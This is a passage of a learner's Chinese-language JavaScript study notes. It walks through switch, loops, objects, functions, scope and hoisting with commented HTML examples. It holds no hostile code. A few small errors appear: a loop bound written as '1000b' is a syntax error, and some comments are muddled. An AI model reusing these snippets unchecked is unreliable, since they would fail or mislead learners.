switch语句和if语句的功能有重复，使用switch可以实现if的功能，反之，使用if可以实现switch语句的功能，所以我们使用时，可以根据自己的习惯选择 */ var num = 1; switch (num) &#123; case 1: console.log(&quot;壹&quot;); break; case 2: console.log(&quot;贰&quot;); break; case 3: console.log(&quot;叁&quot;); break; default: console.log(&quot;芜湖~~&quot;); &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 034 switch练习1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;switch练习&lt;/title&gt; &lt;script&gt; /* */ var score = 80; // 写法一： // switch (parseInt(score / 10)) &#123; // case 10: // case 9: // case 8: // case 7: // case 6: // console.log(&quot;及格&quot;); // break; // default: // console.log(&quot;不及格&quot;); // break; // &#125; // 写法二: true和case中的表达式结果全等与否,全等比较!!!!! switch (true) &#123; case score &gt;= 60: console.log(&quot;及格&quot;); break; default: console.log(&quot;不及格&quot;); break; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 035 while循环1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;while循环&lt;/title&gt; &lt;script&gt; /* 向页面输出连续的数字 循环语句: 通过循环语句可以反复的执行一段代码多次 while循环 - 语法: while(条件表达式)&#123; 语句......(循环体) &#125; 执行时,先对表达式进行求值判断, 如果值为true,则执行循环体,循环体执行完毕后,继续对表达式进行判断,如果为true,则继续执行循环体,以此类推,直到表达式为false结束 先判断,后执行 注意: while(true)&#123; 语句...... &#125; 像这种将表达式写死为true的循环,叫做死循环,这种循环不会停止,除非浏览器关闭,开发中慎用死循环 可以使用break来终止循环 do.......while循环 - 语法: do&#123; 语句...... &#125;while(条件表达式) 循环体执行完毕后,再对while后的表达式进行判断,如果结果为true,则继续执行循环体,执行完毕继续判断,以此类推 如果结果为false,则终止循环 先执行,再判断 do...while可以保证循环至少执行一次,而while不能 */ var a = 0; while (a &lt; 100) &#123; document.write(a++ + &quot;&lt;br/&gt;&quot;); &#125; // 创建一个死循环,往往需要三个步骤 // 1.创建一个初始化变量 // 2.在循环中设置一个条件表达式 // 3.定义一个更新表达式,每次更新初始化变量 &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 036 while练习1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;while练习&lt;/title&gt; &lt;script&gt; var years = 0, money = 1000; while (money &lt; 5000) &#123; money += money * 0.05; years++; &#125; document.write(years); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 037 for循环1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;for循环&lt;/title&gt; &lt;script&gt; /* for语句,也是一个循环语句,也称为for循环 for循环中,为我们提供了专门的位置来放三个表达式: 1.初始化表达式 2.条件表达式 3.更新表达式 for循环语法: for(初始化表达式;条件表达式;更新表达式)&#123; 语句..... &#125; for循环的执行流程: 1.执行初始化表达式,初始化变量(只执行一次) 2.执行条件表达式,判断是否执行循环 如果为true,则执行循环 如果为false,则终止循环 3.执行更新表达式,执行更新表达式完毕后,继续重复步骤2 */ for (var i = 0; i &lt; 10; i++) &#123; console.log(i); &#125; /* for循环中的三个部分都可以省略,也可以写在外部 如果在for循环中不写任何的表达式,只写两个; 此时循环是一个死循环,会一直执行下去,慎用 */ &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 三道题1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;三道例题&lt;/title&gt; &lt;script&gt; // 练习一 var sum = 0; for (var i = 1; i &lt;= 100; i++) &#123; if (i % 2 != 0) sum += i &#125; console.log(sum); // 2500 //练习二 var total = 0; sum = 0; for (i = 1; i &lt; 100; i++) &#123; if (i % 7 == 0) &#123; sum += i; total++; &#125; &#125; console.log(sum, total); // 735 14 // 练习三 console.log(&quot;水仙花数--------------------&quot;); var one, ten, hundred; for (i = 100; i &lt; 1000b ; i++) &#123; one = i % 10; ten = ((i % 100) - one) / 10; hundred = parseInt(i / 100); if (one * one * one + ten * ten * ten + hundred * hundred * hundred == i) console.log(i); &#125; // 153 370 371 407 &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 039 质数练习1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;质数练习&lt;/title&gt; &lt;script&gt; /* */ var num; while (true) &#123; num = prompt(&quot;请输入数字（必须大于1的整数）：&quot;); if (num &gt; 1 &amp;&amp; parseInt(num) == num) &#123; break; &#125; else &#123; alert(&quot;输入非法！&quot;) &#125; &#125; for (var i = parseInt(num / 2); i &gt; 1; i--) &#123; // var i = Math.sqrt(num)性能更好 if (num % i == 0) &#123; console.log(num + &quot;不是质数&quot;); break; &#125; &#125; if (i == 1) &#123; console.log(num + &quot;是质数&quot;); &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 041 嵌套for循环1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;嵌套for循环&lt;/title&gt; &lt;script&gt; // var str = &quot;*&quot;; // for (var i = 0; i &lt; 6; i++) &#123; // console.log(str); // str += &quot; *&quot;; // &#125; // for (var i = 1; i &lt;= 10; i++) &#123; // for (var j = i; j &gt; 0; j--) &#123; // document.write(&quot;* &quot;); // &#125; // document.write(&quot;&lt;br/&gt;&quot;); // &#125; // 倒三角 for (var i = 10; i &gt; 0; i--) &#123; for (var j = i; j &gt; 0; j--) &#123; document.write(&quot;* &quot;); &#125; document.write(&quot;&lt;br/&gt;&quot;); &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 042 两个练习1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;两个练习&lt;/title&gt; &lt;script&gt; /* 99乘法表 */ for (var i = 1; i &lt; 10; i++) &#123; for (var j = 1; i &gt;= j; j++) &#123; document.write(j + &quot;*&quot; + i + &quot;=&quot; + i * j + &quot;&amp;nbsp;&amp;nbsp;&quot;); &#125; document.write(&quot;&lt;br/&gt;&quot;) &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 044 break和continue语句1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;break和continue&lt;/title&gt; &lt;script&gt; /* break关键字可以用来退出switch或循环语句，在if语句中使用会报错 多个循环嵌套时，只会对最内层循环起作用 */ /* 可以为循环语句创建一个label，来标识当前的循环 label:循环语句 使用break语句时，可以在break后跟上label，这样将会结束指定的循环，而不是最近的循环 */ outer: for (var i = 1; i &lt; 5; i++) &#123; console.log(&quot;外层循环&quot;); for (var j = 1; j &lt; 5; j++) &#123; console.log(&quot;内层循环&quot;); console.log(j); if (j == 2) &#123; break outer; &#125; &#125; &#125; /* continue用来跳过当次循环 同样continue也是默认只会对离他最近的循环起作用 同样可以在后面跟上label，这样将会结束指定的循环，而不是最近的循环 */ for (var a = 1; a &lt; 5; a++) &#123; if (a == 3) continue; console.log(a); &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 测试程序性能：在程序执行前开启一个计时器console.time()，需要一个字符串作为参数，这个字符串将会作为计时器的标识。 console.timeEnd()用来停止一个计时器，需要一个计时器的标识作为参数。 45 质数练习改进寻找到Math.sqrt(i)即可 46-47 对象简介、基本操作1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;对象简介&lt;/title&gt; &lt;script&gt; /* JS数据类型： - Number 数值 - String 字符串 - Null 空值 - Undefined 未定义 - Boolean 布尔值 - 以上五种类型属于基本数据类型，以后我们看到的值只要不是上面五种，全都是对象 - Object 对象（引用数据类型） 基本的数据类型都是单一的值&quot;hello&quot; 123 true，值和值之间没有任何联系 例如在JS中来表示一个人的信息（name、gender、age），如果使用基本数据类型，我们所创建的变量都是独立的，不能成为一个整体。 对象属于复合数据类型，在对象中可以保存多个不同的数据类型的属性。 对象分类： 1.内建对象 - 由ES标准中定义的对象，在任何的ES的实现中均可使用 - 比如：Math String Number Boolean Function Object…… 2.宿主对象 - 由JS的运行环境提供的对象，目前来讲主要指由浏览器提供的对象 - 比如BOM DOM，比如console对象和document对象 3.自定义对象 - 由开发人员自己创建的对象 */ // 创建对象 /* 使用new关键字调用的函数，是构造函数constructor 构造函数是专门用来创建对象的函数 */ var obj = new Object(); console.log(obj); console.log(typeof obj); // object /* 在对象保存的值称为属性 向对象添加属性 语法：对象.属性名 = 属性值; */ obj.name = &quot;张加林&quot;; obj.age = 20; obj.gender = &quot;男&quot;; console.log(obj); /* 读取对象中的属性 语法：对象.语法 如果读取的对对象中没有属性，不会报错，而是会返回undefined */ console.log(obj.name); console.log(obj.what); /* 修改对象的属性值 语法：对象.属性名 = 新值; */ obj.name = &quot;zl&quot;; /* 删除对象属性 语法：delete 对象.属性名 */ delete obj.name; console.log(obj); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 048 属性名和属性值1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;属性名和属性值&lt;/title&gt; &lt;script&gt; /* 向对象中添加属性 属性名： - 对象名不强制要求遵守标识符的规范 什么乱七八糟的名字都可以使用，但是使用时尽量遵守标识符的规范去做。 */ var obj = new Object(); obj.name = &quot;张加林&quot;; /* 如果使用特殊的属性名，不能采用.的方式来操作 需要使用另一种方式： 语法：对象[&quot;属性名&quot;] = 属性值 读取时也需要采用这种方式 使用[]这种形式去操作属性，更加灵活， 在[]中可以直接传递一个变量，这样变量值是多少就会读取那个属性 */ obj[&quot;123&quot;] = 789; var str = &quot;123&quot;; console.log(obj[str]); /* 属性值：JS对象的属性值，可以是任意的数据类型 甚至也可以是一个对象 */ obj.test = true; console.log(obj); obj.test = undefined; console.log(obj); obj.test = null; console.log(obj); // 对象的属性值为对象，可以无限套娃 var obj2 = new Object(); obj2.school = &quot;UESTC&quot;; obj.info = obj2; console.log(obj); // 检查对象中是否含有某个属性 /* in运算符 - 通过该运算符，可以检查一个对象是否含有指定的属性 如果有则返回true，没有则返回false - 语法： &quot;属性名&quot; in 对象 */ console.log(&quot;info&quot; in obj); // true console.log(&quot;obj2&quot; in obj); // false console.log(&quot;obj3&quot; in obj); // false &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 049 基本数据类型和引用数据类型 1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;基本数据类型和引用数据类型&lt;/title&gt; &lt;script&gt; // /* 基本数据类型：Number、String、Null、Undefined、Boolean 引用数据类型：Object JS中的变量都是保存到栈内存中的 基本数据类型都直接存储在栈内存中，值与值之间是相互独立的，修改一个变量不会影响到其他变量 对象是保存在堆内存中的，每创建一个新的对象，就会在堆内存中开辟出一个新的内存空间。而变量保存的是对象的内存地址(对象的引用)，如果两个变量保存的是同一个对象引用，当通过一个变量修改属性时，另一个也会受到影响 */ var a = 123; var b = a; a++; console.log(&quot;a = &quot; + a); // 124 console.log(&quot;b = &quot; + b); // 123 var obj = new Object(); obj.name = &quot;张加林&quot;; var obj2 = obj; console.log(obj.name); //张加林 console.log(obj2.name); //张加林 // 修改obj属性 obj.name = &quot;mk&quot;; console.log(obj.name); //mk console.log(obj2.name); //mk /* 给对象赋值null等同于清空指针 */ obj = null; console.log(obj); // null console.log(obj2); // &#123;name: &#x27;mk&#x27;&#125; var obj3 = new Object(); var obj4 = new Object(); obj3.name = &quot;zl&quot;; obj4.name = &quot;zl&quot;; /* 当比较两个基本数据类型的值时，就是比较值 而比较两个引用数据类型，比较的是对象的内存地址 如果两个对象是一摸一样的，但是地址不同，它会返回false */ console.log(obj3 == obj4); // false，因为内存地址不同 &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 050 对象字面量1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;对象字面量&lt;/title&gt; &lt;script&gt; // 创建一个对象 // var obj = new Object(); // 使用对象字面量来创建一个对象 var obj = &#123;&#125;; console.log(typeof obj); obj.name = &quot;张加林&quot;; console.log(obj.name); /* 使用对象字面量可以在创建对象时，直接指定对象中的属性 语法：&#123;属性名:属性值,属性名:属性值……&#125; 对象字面量的属性名可以加引号，也可以不加，建议不加 如果要使用一些特殊的名字，则必须加引号 属性名和属性值是一组一组的名值对结构 名和值之间使用:连接，多个名值之间使用,隔开，如果一个属性之后没有其他属性了，则不要写, */ var obj2 = &#123; name: &quot;miketaylorjuly123.cn&quot;, age: 20, gender: &quot;男&quot; &#125;; console.log(obj2); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 051 函数的简介1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;函数简介&lt;/title&gt; &lt;script&gt; /* 函数 - 函数也是一个对象 - 函数中可以封装一些功能（代码），在需要时可以执行这些功能（代码） - 函数中可以保存一些代码在需要的时候调用 */ // 创建一个函数对象 // 可以将要封装的代码以字符串的形式传递给构造函数 // 开发中，很少使用构造函数来创建一个函数，几乎不用 var fun = new Function(&quot;console.log(&#x27;你好&#x27;);&quot;); // 封装到函数中的代码不会立即执行，函数中的代码会在函数调用的时候执行，调用函数语法，函数对象(); console.log(fun); console.log(typeof fun); // 当调用函数时，函数中封装的代码会按照顺序执行 fun(); fun.wuhu = &quot;张加林&quot;; console.log(fun.wuhu); // 函数是对象 /* 使用函数声明来创建一个函数 语法： function 函数名([形参1,形参2,……,形参N])&#123; 函数体; &#125; */ function printcsl() &#123; console.log(&quot;一&quot;); console.log(&quot;二&quot;); console.log(&quot;三&quot;); &#125; printcsl(); /* 使用函数表达式创建一个函数 var 函数名 = function 函数名([形参1,形参2,……,形参N])&#123; 函数体; &#125; 创建一个匿名函数对象，然后将函数赋值给一个变量 */ var test = function () &#123; console.log(&quot;一&quot;); console.log(&quot;二&quot;); console.log(&quot;三&quot;); &#125; test(); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 052 函数的参数1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;函数的参数&lt;/title&gt; &lt;script&gt; /* 函数的参数 可以在函数的()中指定一个或多个形参(形式参数) 多个形参之间使用,隔开，声明形式参数就相当于在函数内部声明了对应的变量 在调用函数时，可以在()中指定实参(实际参数) 实际参数会赋值给函数中对应的形参 */ var sum = function (a, b) &#123; console.log(&quot;和为&quot; + (a + b)); &#125; sum(1, 3); /* 调用函数时，解析器不会检查实参的类型 所以要注意，是否有可能会接收到非法的参数，如果有可能则需要对参数进行类型的检查 函数的实参可以是任意的数据类型 */ /* 调用函数时，解析器也不会检查实参数量 多余的实参不会被赋值 如果实参的数量少于形参，则没有对应实参的形参将是undefined 注意：数字 + undefined = NaN */ &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 053 函数返回值1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;函数的返回值&lt;/title&gt; &lt;script&gt; /* 创建一个函数，用来计算三个数的和 设置函数返回值 返回结果：return 值; return后的值将会作为函数的执行结果返回 可以定义变量接收返回值 在函数中，return后的语句都不会执行 return; 或者不写return，都将返回undefined return后可以跟任意类型的值 */ function sum(a, b, c) &#123; return a + b + c; &#125; console.log(sum(100, 200, 300)); console.log(alert(&quot;你好&quot;)); // 输出undefined，说明alert()函数没有返回值 &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 054 实参可以是任何值1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;实参可以是任何值&lt;/title&gt; &lt;script&gt; function isEvenNum(num) &#123; // if (num % 2 == 0) // return true; // else return false; return num % 2 == 0; &#125; console.log(isEvenNum(302)); // 计算圆的面积 function circleArea(radius) &#123; return radius * radius * Math.PI &#125; console.log(circleArea(5)); /* 创建一个函数，可以在控制台输出一个人的信息 可以输出人的name age gender address 实参可以是任意的数据类型，也可以是一个对象 当我们的参数过多时，可以将参数封装到一个对象中，然后通过对象传递 */ var person = &#123; name: &quot;张加林&quot;, age: 20, school: &quot;郫县男子职业技术学院&quot; &#125; function output(obj) &#123; console.log(obj); &#125; output(person); /* 实参可以是对象，也可以是函数 */ function hello() &#123; console.log(&quot;你好！&quot;); &#125; function hello2(functionTest) &#123; console.log(&quot;套娃行为&quot;); functionTest(); &#125; /* hello() - 调用函数，相当于使用函数的返回值 hello - 函数对象，相当于直接使用函数对象 */ hello2(hello); // 将一个匿名函数作为实参传递给函数 hello2(function () &#123; console.log(&quot;就是玩！&quot;); &#125;) &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 055 返回值的类型1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;返回值的类型&lt;/title&gt; &lt;script&gt; /* break退出当前循环 continue用于跳过当次循环 return可以结束整个函数 返回值可以是任意数据类型，也可以是对象，函数也可以 */ function fun() &#123; // 在函数内部再声明一个函数 function fun2() &#123; alert(&quot;函数中的函数&quot;); &#125; // 注意区分 return fun2; // undefined // return fun2; // 函数对象 &#125; console.log(fun()); fun()(); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 056 立即执行函数1&lt;!DOCTYPE html&gt;&lt;html lang&#x3D;&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt; &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt; &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt; &lt;title&gt;立即执行函数&lt;&#x2F;title&gt; &lt;script&gt; &#x2F;* 立即执行函数 函数定义完后，立即调用，这种函数叫做立即执行函数，往往只会执行一次 *&#x2F; &#x2F;&#x2F; 匿名函数自调用 (function () &#123; alert(&quot;你好&quot;); &#125;)(); &lt;&#x2F;script&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 057 方法1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;方法&lt;/title&gt; &lt;script&gt; /* 创建对象 */ var obj = new Object(); // 向对象中添加属性 obj.name = &quot;张加林&quot;; obj.age = 20; obj.sayName = function () &#123; console.log(obj.name); &#125;; obj.sayName(); // 调方法 /* 函数也可以称为对象的属性， 如果一个函数作为一个对象的属性保存，那么我们称这个函数是这个对象的方法，调用函数就说调用对象的方法（method），但是他只是名称上的区别而没有其他区别 */ &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 057-2 枚举对象中的属性1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;枚举对象中的属性&lt;/title&gt; &lt;script&gt; obj = &#123; name: &quot;张加林&quot;, age: 20, school: &quot;郫县男子职业技术学院&quot; &#125;; /* 使用for……in 语句 语法： for(var 变量 in 对象)&#123; &#125; for……in语句中，对象中有几个属性，循环体就会执行几次 每次执行时，会将变量中的一个属性名赋值给变量 */ for (var i in obj) &#123; console.log(obj[i]); &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 058 全局作用域(scope)1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;全局作用域&lt;/title&gt; &lt;script&gt; /* 作用域 - 作用域指的是一个变量的作用范围 - 在JS中一共有两种作用域： 1.全局作用域 - 直接编写在script标签中的JS代码，都在全局作用域 - 全局作用域在打开页面时创建，在页面关闭时销毁 - 在全局作用域中有一个对象window，它代表一个浏览器窗口，它由浏览器创建，我们可以直接使用 - 在全局作用域中 创建的变量都会作为window对象的属性值保存 创建的方法都会作为window对象的方法保存 2.函数作用域 */ var a = 10, b = 20; console.log(window.a, window.b, window.c);//千万注意，访问window上不存在的属性值，不会报错，而是返回undefined function fun() &#123; console.log(&quot;你好&quot;); &#125; window.fun(); // fun(); window.alert(&quot;你好啊&quot;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 058(二) 变量声明提前1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;变量声明的提前&lt;/title&gt; &lt;script&gt; /* 变量声明的提前 - 使用var关键字的变量，会在所有代码执行之前被声明（但是不会赋值），但是如果如果声明变量时不使用var关键字，则变量不会被声明提前 函数的声明提前 - 使用函数声明形式创建的函数function 函数名()&#123;&#125; 它会在所有代码执行之前就被创建，所以我们可以在函数声明前调用函数 - 使用函数表达式创建的函数不会被声明提前，所以不能在声明前使用 - 全局作用域中的变量都是全局变量 在页面的任意部分都可以访问到 */ a = 1234; // 相当于window.a = 1234; console.log(a); // 1234 console.log(b); // undefined var b = 1; // console.log(c); // 报错 // c = 1; fun(); // 正常 fun2(); // 报错 // 函数声明会被提前 function fun() &#123; console.log(&quot;fun函数&quot;); &#125; // var关键字使得fun2在代码执行前被声明，但是没有赋值，所有不能在声明前调用 var fun2 = function () &#123; console.log(&quot;fun2函数&quot;); &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 059 函数作用域(易错易混)1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;函数作用域&lt;/title&gt; &lt;script&gt; /* 函数作用域 - 调用函数时创建函数作用域，函数执行完毕后，函数作用域销毁 - 每调用一次函数就会创建一个新的函数作用域，他们之间是相互独立的 - 在函数作用域中可以访问到全局作用域中的变量，在全局作用域中无法访问到函数作用域中的变量 - 当在函数作用域中操作一个变量时，它会先在自身作用域中寻找，如果有就直接使用，没有就向上一级作用域中寻找（不一定是全局作用域，因为可以多层嵌套），直到找到全局作用域为止 如果全局作用域中依然没有找到，则会报错 - 在函数中要访问全局变量，可以使用window对象 */ // 创建一个变量 var a = 10; function fun() &#123; var a = 2; var b = 1; console.log(a); // 2 console.log(window.a); &#125; fun(); console.log(a); // console.log(b); // 报错 /* 在函数作用域中也有声明提前的特性 使用var关键字声明的变量，会在函数所有的代码执行之前被声明 函数声明也会在所有代码执行之前进行 */ function fun1() &#123; console.log(a); // undefined var a = 100; &#125; function fun2() &#123; console.log(a);// 10 &#125; fun1(); fun2(); function fun3() &#123; fun4(); var a = 35; function fun4() &#123; console.log(a); //undefined &#125; &#125; fun3(); /* 函数中不使用var声明的变量都会成为全局变量 */ var c = 33; function fun5() &#123; // console.log(&quot;c = &quot; + c); // var c = 10; console.log(&quot;c = &quot; + c); // 33 c = 10; d = 10; &#125; fun5(); console.log(d); // 10 /* 定义形参就相当于在函数作用域中声明了变量 */ var e = 30; function fun6(e) &#123; // var e; alert(e); &#125; fun6(); // 弹出undefined fun6(20); // 弹出20 &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 060 debugvscode F5 12345678910111213141516171819202122232425262728293031&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta 